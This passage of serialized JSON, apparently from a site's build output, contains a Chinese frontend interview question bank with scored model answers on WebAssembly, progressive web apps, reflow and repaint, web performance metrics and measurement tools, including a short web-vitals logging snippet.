格式文件较小，传输高效，加载速度快。","text":"**1：**  小体积：Wasm 格式文件较小，传输高效，加载速度快。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":"  小体积：Wasm 格式文件较小，传输高效，加载速度快。","text":"  小体积：Wasm 格式文件较小，传输高效，加载速度快。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## WebAssembly 的工作原理是什么？\\n\\n","depth":2,"text":"WebAssembly 的工作原理是什么？","tokens":[{"type":"text","raw":"WebAssembly 的工作原理是什么？","text":"WebAssembly 的工作原理是什么？","escaped":false}]},{"type":"heading","raw":"#### 类型：`架构`\\n\\n","depth":4,"text":"类型：`架构`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`架构`","text":"架构"}]},{"type":"heading","raw":"#### 级别：`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（4 分）\\n\\n","depth":4,"text":"解答（4 分）","tokens":[{"type":"text","raw":"解答（4 分）","text":"解答（4 分）","escaped":false}]},{"type":"list","raw":"- **1：** 编写源代码：使用支持 WebAssembly 的语言（如 C、C++ 或 Rust）编写源代码。\\n- **1：** 编译为 WebAssembly 模块：将源代码编译为 .wasm 文件，这是 WebAssembly 的二进制格式。\\n- **1：** 在浏览器中加载和运行：通过 JavaScript 在浏览器中加载 .wasm 文件并实例化。\\n- **1：** 执行 WebAssembly 函数：JavaScript 调用 WebAssembly 函数，执行高性能计算任务。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** 编写源代码：使用支持 WebAssembly 的语言（如 C、C++ 或 Rust）编写源代码。\\n","task":false,"loose":false,"text":"**1：** 编写源代码：使用支持 WebAssembly 的语言（如 C、C++ 或 Rust）编写源代码。","tokens":[{"type":"text","raw":"**1：** 编写源代码：使用支持 WebAssembly 的语言（如 C、C++ 或 Rust）编写源代码。","text":"**1：** 编写源代码：使用支持 WebAssembly 的语言（如 C、C++ 或 Rust）编写源代码。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 编写源代码：使用支持 WebAssembly 的语言（如 C、C++ 或 Rust）编写源代码。","text":" 编写源代码：使用支持 WebAssembly 的语言（如 C、C++ 或 Rust）编写源代码。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 编译为 WebAssembly 模块：将源代码编译为 .wasm 文件，这是 WebAssembly 的二进制格式。\\n","task":false,"loose":false,"text":"**1：** 编译为 WebAssembly 模块：将源代码编译为 .wasm 文件，这是 WebAssembly 的二进制格式。","tokens":[{"type":"text","raw":"**1：** 编译为 WebAssembly 模块：将源代码编译为 .wasm 文件，这是 WebAssembly 的二进制格式。","text":"**1：** 编译为 WebAssembly 模块：将源代码编译为 .wasm 文件，这是 WebAssembly 的二进制格式。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 编译为 WebAssembly 模块：将源代码编译为 .wasm 文件，这是 WebAssembly 的二进制格式。","text":" 编译为 WebAssembly 模块：将源代码编译为 .wasm 文件，这是 WebAssembly 的二进制格式。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 在浏览器中加载和运行：通过 JavaScript 在浏览器中加载 .wasm 文件并实例化。\\n","task":false,"loose":false,"text":"**1：** 在浏览器中加载和运行：通过 JavaScript 在浏览器中加载 .wasm 文件并实例化。","tokens":[{"type":"text","raw":"**1：** 在浏览器中加载和运行：通过 JavaScript 在浏览器中加载 .wasm 文件并实例化。","text":"**1：** 在浏览器中加载和运行：通过 JavaScript 在浏览器中加载 .wasm 文件并实例化。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 在浏览器中加载和运行：通过 JavaScript 在浏览器中加载 .wasm 文件并实例化。","text":" 在浏览器中加载和运行：通过 JavaScript 在浏览器中加载 .wasm 文件并实例化。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 执行 WebAssembly 函数：JavaScript 调用 WebAssembly 函数，执行高性能计算任务。","task":false,"loose":false,"text":"**1：** 执行 WebAssembly 函数：JavaScript 调用 WebAssembly 函数，执行高性能计算任务。","tokens":[{"type":"text","raw":"**1：** 执行 WebAssembly 函数：JavaScript 调用 WebAssembly 函数，执行高性能计算任务。","text":"**1：** 执行 WebAssembly 函数：JavaScript 调用 WebAssembly 函数，执行高性能计算任务。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 执行 WebAssembly 函数：JavaScript 调用 WebAssembly 函数，执行高性能计算任务。","text":" 执行 WebAssembly 函数：JavaScript 调用 WebAssembly 函数，执行高性能计算任务。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 什么是PWA？\\n\\n","depth":2,"text":"什么是PWA？","tokens":[{"type":"text","raw":"什么是PWA？","text":"什么是PWA？","escaped":false}]},{"type":"heading","raw":"#### 类型：`编程`\\n\\n","depth":4,"text":"类型：`编程`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`编程`","text":"编程"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（1分）\\n\\n","depth":4,"text":"解答（1分）","tokens":[{"type":"text","raw":"解答（1分）","text":"解答（1分）","escaped":false}]},{"type":"list","raw":"- **1：** 渐进式网络应用（PWA）是谷歌在2015年底提出的概念。基本上算是web应用程序，但在外观和感觉上与原生app类似。支持PWA的网站可以提供脱机工作、推送通知和设备硬件访问等功能。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** 渐进式网络应用（PWA）是谷歌在2015年底提出的概念。基本上算是web应用程序，但在外观和感觉上与原生app类似。支持PWA的网站可以提供脱机工作、推送通知和设备硬件访问等功能。","task":false,"loose":false,"text":"**1：** 渐进式网络应用（PWA）是谷歌在2015年底提出的概念。基本上算是web应用程序，但在外观和感觉上与原生app类似。支持PWA的网站可以提供脱机工作、推送通知和设备硬件访问等功能。","tokens":[{"type":"text","raw":"**1：** 渐进式网络应用（PWA）是谷歌在2015年底提出的概念。基本上算是web应用程序，但在外观和感觉上与原生app类似。支持PWA的网站可以提供脱机工作、推送通知和设备硬件访问等功能。","text":"**1：** 渐进式网络应用（PWA）是谷歌在2015年底提出的概念。基本上算是web应用程序，但在外观和感觉上与原生app类似。支持PWA的网站可以提供脱机工作、推送通知和设备硬件访问等功能。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 渐进式网络应用（PWA）是谷歌在2015年底提出的概念。基本上算是web应用程序，但在外观和感觉上与原生app类似。支持PWA的网站可以提供脱机工作、推送通知和设备硬件访问等功能。","text":" 渐进式网络应用（PWA）是谷歌在2015年底提出的概念。基本上算是web应用程序，但在外观和感觉上与原生app类似。支持PWA的网站可以提供脱机工作、推送通知和设备硬件访问等功能。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## PWA有那些优点？\\n\\n","depth":2,"text":"PWA有那些优点？","tokens":[{"type":"text","raw":"PWA有那些优点？","text":"PWA有那些优点？","escaped":false}]},{"type":"heading","raw":"#### 类型：`编程`\\n\\n","depth":4,"text":"类型：`编程`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`编程`","text":"编程"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（9分）\\n\\n","depth":4,"text":"解答（9分）","tokens":[{"type":"text","raw":"解答（9分）","text":"解答（9分）","escaped":false}]},{"type":"list","raw":"- **1：** 更小更快: 渐进式的web应用程序比原生应用程序小得多。他们甚至不需要安装。这是他们没有浪费磁盘空间和加载速度非常快\\n- **1：** 响应式界面: PWA支持的网页能够自动适应各种屏幕大小。它可以是手机、平板、台式机或笔记本。\\n- **1：** 无需更新: 大多数移动应用程序需要每周定期更新。与普通网站一样，每当用户交互发生且不需要应用程序或游戏商店批准时，PWA总是加载最新更新版本\\n- **1：** 高性价比：原生移动应用需要分别为Android和iOS设备开发，开发成本非常高。另一方面，PWAs有着相同的功能，但只是先前价格的一小部分，开发成本低。\\n- **1：** SEO优势：搜索引擎可以发现PWAs，并且加载速度非常快。就像其他网站一样，它们的链接也可以共享。提供良好的用户体验和结果，在SEO排名提高。\\n- **1：** 脱机功能：由于service worker API的支持，可以在脱机或低internet连接中访问PWAs。\\n- **1：** 推送通知：通过推送通知的支持，PWAs轻松地与用户进行交互，提供非常棒的用户体验。\\n- **1：** 零安装：在浏览过程中，PWA会在手机和平板电脑上有自己的图标，就像移动应用程序一样，但不需要经过冗长的安装过程。\\n- **1：** 绕过应用商店","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** 更小更快: 渐进式的web应用程序比原生应用程序小得多。他们甚至不需要安装。这是他们没有浪费磁盘空间和加载速度非常快\\n","task":false,"loose":false,"text":"**1：** 更小更快: 渐进式的web应用程序比原生应用程序小得多。他们甚至不需要安装。这是他们没有浪费磁盘空间和加载速度非常快","tokens":[{"type":"text","raw":"**1：** 更小更快: 渐进式的web应用程序比原生应用程序小得多。他们甚至不需要安装。这是他们没有浪费磁盘空间和加载速度非常快","text":"**1：** 更小更快: 渐进式的web应用程序比原生应用程序小得多。他们甚至不需要安装。这是他们没有浪费磁盘空间和加载速度非常快","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 更小更快: 渐进式的web应用程序比原生应用程序小得多。他们甚至不需要安装。这是他们没有浪费磁盘空间和加载速度非常快","text":" 更小更快: 渐进式的web应用程序比原生应用程序小得多。他们甚至不需要安装。这是他们没有浪费磁盘空间和加载速度非常快","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 响应式界面: PWA支持的网页能够自动适应各种屏幕大小。它可以是手机、平板、台式机或笔记本。\\n","task":false,"loose":false,"text":"**1：** 响应式界面: PWA支持的网页能够自动适应各种屏幕大小。它可以是手机、平板、台式机或笔记本。","tokens":[{"type":"text","raw":"**1：** 响应式界面: PWA支持的网页能够自动适应各种屏幕大小。它可以是手机、平板、台式机或笔记本。","text":"**1：** 响应式界面: PWA支持的网页能够自动适应各种屏幕大小。它可以是手机、平板、台式机或笔记本。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 响应式界面: PWA支持的网页能够自动适应各种屏幕大小。它可以是手机、平板、台式机或笔记本。","text":" 响应式界面: PWA支持的网页能够自动适应各种屏幕大小。它可以是手机、平板、台式机或笔记本。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 无需更新: 大多数移动应用程序需要每周定期更新。与普通网站一样，每当用户交互发生且不需要应用程序或游戏商店批准时，PWA总是加载最新更新版本\\n","task":false,"loose":false,"text":"**1：** 无需更新: 大多数移动应用程序需要每周定期更新。与普通网站一样，每当用户交互发生且不需要应用程序或游戏商店批准时，PWA总是加载最新更新版本","tokens":[{"type":"text","raw":"**1：** 无需更新: 大多数移动应用程序需要每周定期更新。与普通网站一样，每当用户交互发生且不需要应用程序或游戏商店批准时，PWA总是加载最新更新版本","text":"**1：** 无需更新: 大多数移动应用程序需要每周定期更新。与普通网站一样，每当用户交互发生且不需要应用程序或游戏商店批准时，PWA总是加载最新更新版本","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 无需更新: 大多数移动应用程序需要每周定期更新。与普通网站一样，每当用户交互发生且不需要应用程序或游戏商店批准时，PWA总是加载最新更新版本","text":" 无需更新: 大多数移动应用程序需要每周定期更新。与普通网站一样，每当用户交互发生且不需要应用程序或游戏商店批准时，PWA总是加载最新更新版本","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 高性价比：原生移动应用需要分别为Android和iOS设备开发，开发成本非常高。另一方面，PWAs有着相同的功能，但只是先前价格的一小部分，开发成本低。\\n","task":false,"loose":false,"text":"**1：** 高性价比：原生移动应用需要分别为Android和iOS设备开发，开发成本非常高。另一方面，PWAs有着相同的功能，但只是先前价格的一小部分，开发成本低。","tokens":[{"type":"text","raw":"**1：** 高性价比：原生移动应用需要分别为Android和iOS设备开发，开发成本非常高。另一方面，PWAs有着相同的功能，但只是先前价格的一小部分，开发成本低。","text":"**1：** 高性价比：原生移动应用需要分别为Android和iOS设备开发，开发成本非常高。另一方面，PWAs有着相同的功能，但只是先前价格的一小部分，开发成本低。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 高性价比：原生移动应用需要分别为Android和iOS设备开发，开发成本非常高。另一方面，PWAs有着相同的功能，但只是先前价格的一小部分，开发成本低。","text":" 高性价比：原生移动应用需要分别为Android和iOS设备开发，开发成本非常高。另一方面，PWAs有着相同的功能，但只是先前价格的一小部分，开发成本低。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** SEO优势：搜索引擎可以发现PWAs，并且加载速度非常快。就像其他网站一样，它们的链接也可以共享。提供良好的用户体验和结果，在SEO排名提高。\\n","task":false,"loose":false,"text":"**1：** SEO优势：搜索引擎可以发现PWAs，并且加载速度非常快。就像其他网站一样，它们的链接也可以共享。提供良好的用户体验和结果，在SEO排名提高。","tokens":[{"type":"text","raw":"**1：** SEO优势：搜索引擎可以发现PWAs，并且加载速度非常快。就像其他网站一样，它们的链接也可以共享。提供良好的用户体验和结果，在SEO排名提高。","text":"**1：** SEO优势：搜索引擎可以发现PWAs，并且加载速度非常快。就像其他网站一样，它们的链接也可以共享。提供良好的用户体验和结果，在SEO排名提高。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" SEO优势：搜索引擎可以发现PWAs，并且加载速度非常快。就像其他网站一样，它们的链接也可以共享。提供良好的用户体验和结果，在SEO排名提高。","text":" SEO优势：搜索引擎可以发现PWAs，并且加载速度非常快。就像其他网站一样，它们的链接也可以共享。提供良好的用户体验和结果，在SEO排名提高。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 脱机功能：由于service worker API的支持，可以在脱机或低internet连接中访问PWAs。\\n","task":false,"loose":false,"text":"**1：** 脱机功能：由于service worker API的支持，可以在脱机或低internet连接中访问PWAs。","tokens":[{"type":"text","raw":"**1：** 脱机功能：由于service worker API的支持，可以在脱机或低internet连接中访问PWAs。","text":"**1：** 脱机功能：由于service worker API的支持，可以在脱机或低internet连接中访问PWAs。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 脱机功能：由于service worker API的支持，可以在脱机或低internet连接中访问PWAs。","text":" 脱机功能：由于service worker API的支持，可以在脱机或低internet连接中访问PWAs。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 推送通知：通过推送通知的支持，PWAs轻松地与用户进行交互，提供非常棒的用户体验。\\n","task":false,"loose":false,"text":"**1：** 推送通知：通过推送通知的支持，PWAs轻松地与用户进行交互，提供非常棒的用户体验。","tokens":[{"type":"text","raw":"**1：** 推送通知：通过推送通知的支持，PWAs轻松地与用户进行交互，提供非常棒的用户体验。","text":"**1：** 推送通知：通过推送通知的支持，PWAs轻松地与用户进行交互，提供非常棒的用户体验。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 推送通知：通过推送通知的支持，PWAs轻松地与用户进行交互，提供非常棒的用户体验。","text":" 推送通知：通过推送通知的支持，PWAs轻松地与用户进行交互，提供非常棒的用户体验。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 零安装：在浏览过程中，PWA会在手机和平板电脑上有自己的图标，就像移动应用程序一样，但不需要经过冗长的安装过程。\\n","task":false,"loose":false,"text":"**1：** 零安装：在浏览过程中，PWA会在手机和平板电脑上有自己的图标，就像移动应用程序一样，但不需要经过冗长的安装过程。","tokens":[{"type":"text","raw":"**1：** 零安装：在浏览过程中，PWA会在手机和平板电脑上有自己的图标，就像移动应用程序一样，但不需要经过冗长的安装过程。","text":"**1：** 零安装：在浏览过程中，PWA会在手机和平板电脑上有自己的图标，就像移动应用程序一样，但不需要经过冗长的安装过程。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 零安装：在浏览过程中，PWA会在手机和平板电脑上有自己的图标，就像移动应用程序一样，但不需要经过冗长的安装过程。","text":" 零安装：在浏览过程中，PWA会在手机和平板电脑上有自己的图标，就像移动应用程序一样，但不需要经过冗长的安装过程。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 绕过应用商店","task":false,"loose":false,"text":"**1：** 绕过应用商店","tokens":[{"type":"text","raw":"**1：** 绕过应用商店","text":"**1：** 绕过应用商店","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 绕过应用商店","text":" 绕过应用商店","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## PWA有什么缺点？\\n\\n","depth":2,"text":"PWA有什么缺点？","tokens":[{"type":"text","raw":"PWA有什么缺点？","text":"PWA有什么缺点？","escaped":false}]},{"type":"heading","raw":"#### 类型：`编程`\\n\\n","depth":4,"text":"类型：`编程`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`编程`","text":"编程"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（3分）\\n\\n","depth":4,"text":"解答（3分）","tokens":[{"type":"text","raw":"解答（3分）","text":"解答（3分）","escaped":false}]},{"type":"list","raw":"- **1：** 对系统功能的访问权限较低：目前PWA对本机系统功能的访问权限比原生app有限。而且，所有的浏览器都不支持它的全部功能，但可能在不久的将来，它将成为新的开发标准。\\n- **1：** 多数Android，少数iOS：目前更多的支持来自Android。iOS系统只提供了部分。\\n- **1：** 没有审查标准：PWAs不需要任何适用于应用商店中本机应用的审查，这可能会加快进程，但缺乏从应用程序商店中获取推广效益。\\n","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** 对系统功能的访问权限较低：目前PWA对本机系统功能的访问权限比原生app有限。而且，所有的浏览器都不支持它的全部功能，但可能在不久的将来，它将成为新的开发标准。\\n","task":false,"loose":false,"text":"**1：** 对系统功能的访问权限较低：目前PWA对本机系统功能的访问权限比原生app有限。而且，所有的浏览器都不支持它的全部功能，但可能在不久的将来，它将成为新的开发标准。","tokens":[{"type":"text","raw":"**1：** 对系统功能的访问权限较低：目前PWA对本机系统功能的访问权限比原生app有限。而且，所有的浏览器都不支持它的全部功能，但可能在不久的将来，它将成为新的开发标准。","text":"**1：** 对系统功能的访问权限较低：目前PWA对本机系统功能的访问权限比原生app有限。而且，所有的浏览器都不支持它的全部功能，但可能在不久的将来，它将成为新的开发标准。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 对系统功能的访问权限较低：目前PWA对本机系统功能的访问权限比原生app有限。而且，所有的浏览器都不支持它的全部功能，但可能在不久的将来，它将成为新的开发标准。","text":" 对系统功能的访问权限较低：目前PWA对本机系统功能的访问权限比原生app有限。而且，所有的浏览器都不支持它的全部功能，但可能在不久的将来，它将成为新的开发标准。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 多数Android，少数iOS：目前更多的支持来自Android。iOS系统只提供了部分。\\n","task":false,"loose":false,"text":"**1：** 多数Android，少数iOS：目前更多的支持来自Android。iOS系统只提供了部分。","tokens":[{"type":"text","raw":"**1：** 多数Android，少数iOS：目前更多的支持来自Android。iOS系统只提供了部分。","text":"**1：** 多数Android，少数iOS：目前更多的支持来自Android。iOS系统只提供了部分。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 多数Android，少数iOS：目前更多的支持来自Android。iOS系统只提供了部分。","text":" 多数Android，少数iOS：目前更多的支持来自Android。iOS系统只提供了部分。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 没有审查标准：PWAs不需要任何适用于应用商店中本机应用的审查，这可能会加快进程，但缺乏从应用程序商店中获取推广效益。","task":false,"loose":false,"text":"**1：** 没有审查标准：PWAs不需要任何适用于应用商店中本机应用的审查，这可能会加快进程，但缺乏从应用程序商店中获取推广效益。","tokens":[{"type":"text","raw":"**1：** 没有审查标准：PWAs不需要任何适用于应用商店中本机应用的审查，这可能会加快进程，但缺乏从应用程序商店中获取推广效益。","text":"**1：** 没有审查标准：PWAs不需要任何适用于应用商店中本机应用的审查，这可能会加快进程，但缺乏从应用程序商店中获取推广效益。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 没有审查标准：PWAs不需要任何适用于应用商店中本机应用的审查，这可能会加快进程，但缺乏从应用程序商店中获取推广效益。","text":" 没有审查标准：PWAs不需要任何适用于应用商店中本机应用的审查，这可能会加快进程，但缺乏从应用程序商店中获取推广效益。","escaped":false}]}]}]}]},{"key":"前端性能优化","content":"<h1>前端性能优化</h1>\\n<h2>回流重绘</h2>\\n<h4>类型：<code>中级</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（5 分）</h4>\\n<ul>\\n<li><p><strong>1：</strong> 回流：浏览器渲染页面之前需要对结构进行布局计算</p>\\n</li>\\n<li><p><strong>1：</strong> 重绘：将已经计算好布局的容器绘制出来</p>\\n</li>\\n<li><p><strong>1：</strong> 触发回流：页面上有容器的几何属性发生变更</p>\\n</li>\\n<li><p><strong>1：</strong> 触发重绘：容器非几何属性变更 （字体，颜色）</p>\\n</li>\\n<li><p><strong>1：</strong> 回流必定重绘，重绘不一定回流</p>\\n</li>\\n</ul>\\n<h2>前端性能指标有哪些？</h2>\\n<h4>类型：<code>中级</code></h4>\\n<h4>级别：<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（11 分）</h4>\\n<ul>\\n<li><strong>1：</strong> FCP：全称为 First Contentful Paint，即首次内容绘制，表示页面绘制其第一个非白色元素（如文本、图像、非空白 canvas 或 SVG）所需的时间。</li>\\n<li><strong>1：</strong> LCP：全称为 Largest Contentful Paint，即最大内容绘制，用于记录视窗内最大的元素绘制的时间，这个时间会随着页面渲染变化而变化，因为页面中的最大元素在渲染过程中可能会发生改变，该指标会在用户第一次交互后停止记录。</li>\\n<li><strong>1：</strong> TTFB：全称为 Time to First Byte，即首字节时间，表示从点击网页到接收到第一个字节的时间。</li>\\n<li><strong>1：</strong> TBT：全称为 Total Blocking Time，即总阻塞时间，用于衡量的是长任务对主线程的阻塞时间总和。即从首次内容绘制（FCP）到页面达到可交互时间（TTI）期间，主线程因运行长任务而被阻塞的总时间，因此，TBT 会对首次输入延迟有很大影响。长任务是指那些执行时间超过 50 毫秒的 JavaScript 任务，因为它们可能会阻塞页面的渲染和响应，从而影响用户体验。</li>\\n<li><strong>1：</strong> FMP：全称为 First Meaningful Paint，即首次有效渲染。它衡量的是从用户开始加载页面到浏览器首次渲染出对用户来说有意义的内容（如文本、图片、按钮等可交互元素）所花费的时间。</li>\\n<li><strong>1：</strong> FP：全称为 First Paint，即首次绘制，表示浏览器首次将像素渲染到屏幕上的时间点。在性能统计指标中，从用户开始访问 Web 页面的时间点到FP的时间点这段时间可以被视为白屏时间，即用户看到的都是没有任何内容的白色屏幕。FP 指标反映了页面的白屏时间，白屏时间的长短直接影响了用户的体验和满意度。</li>\\n<li><strong>1：</strong> SI：全称为 Speed Index，即速度指数，用于衡量页面渲染用户可见内容迅速程度。Speed Index 并不是一个具体的时间点，而是一个综合性指标。它表示页面从加载开始到页面内容基本可见的过程中，用户感受到的加载速度。该指标是基于视频捕获的可视进度或从绘制事件的可视进展来计算。</li>\\n<li><strong>1：</strong> CLS：全称为 Cumulative Layout Shift，即累积布局偏移，用于衡量一个页面在加载过程中，由于内容的加载和渲染，导致页面布局发生多次变化的情况。具体来说，CLS 指标衡量的是页面中可见元素在加载过程中由于内容加载而发生的位置偏移。这些元素可能因为图片、广告、视频等资源的加载而发生移动。如果一个页面的元素在加载过程中频繁移动，那么这个页面的 CLS 值就会比较高，这通常不是一个好的用户体验。</li>\\n<li><strong>1：</strong> INP：全称为 Interaction to Next Paint，即交互到下一次绘制，用来衡量用户与网页交互后，浏览器完成下一次屏幕绘制所需的时间。这个指标主要关注的是用户交互（如点击、触摸、键盘输入等）之后，页面响应并渲染新内容的速度。</li>\\n<li><strong>1：</strong> FID：全称为 First Input Delay，即首次输入延迟，是衡量网页性能的一个重要指标，它反映了用户在页面加载过程中首次与页面交互时的体验。FID 特别关注用户首次点击按钮、链接、输入字段等可交互元素时，页面响应这些交互所需的时间。</li>\\n<li><strong>1：</strong> TTI：全称为 Time To Interactive，即可交互时间，用于评估页面从开始加载到用户可以顺畅地与之交互的时间点。TTI 特别关注页面的响应性和交互性，它试图捕捉用户能够开始与页面进行流畅交互的瞬间。</li>\\n</ul>\\n<h2>Core Web Vitals指的是什么？</h2>\\n<h4>类型：<code>中级</code></h4>\\n<h4>级别：<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<ul>\\n<li><strong>1：</strong> Core Web Vitals 是一组由Google推出的关键用户体验指标，旨在帮助开发人员评估和优化网站的性能。这些指标主要关注三个方面：加载性能、交互性能和视觉稳定性。</li>\\n</ul>\\n<blockquote>\\n<p>Core Web Vitals 包含了三个指标：INP、LCP、CLS</p>\\n</blockquote>\\n<h2>性能测量工具有哪些？</h2>\\n<h4>类型：<code>中级</code></h4>\\n<h4>级别：<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（6 分）</h4>\\n<ul>\\n<li><strong>2：</strong> 可以借助 Gooogle 开源的 web-vitals 库来测量一些性能指标：</li>\\n</ul>\\n<pre><code class=\\"language-javascript\\">import {onCLS, onINP, onLCP, onFCP, onFID, onTTFB} from &#39;web-vitals&#39;;\\n\\nonCLS(console.log);\\nonINP(console.log);\\nonLCP(console.log);\\nonFCP(console.log);\\nonFID(console.log);\\nonTTFB(console.log);\\n</code></pre>\\n<ul>\\n<li><p><strong>2：</strong> 使用 Google 提供免费的 PageSpeed Insights (PSI) 工具来测试网站的性能：<br><img src=\\"/public/images/PSI.png\\" alt=\\"alt 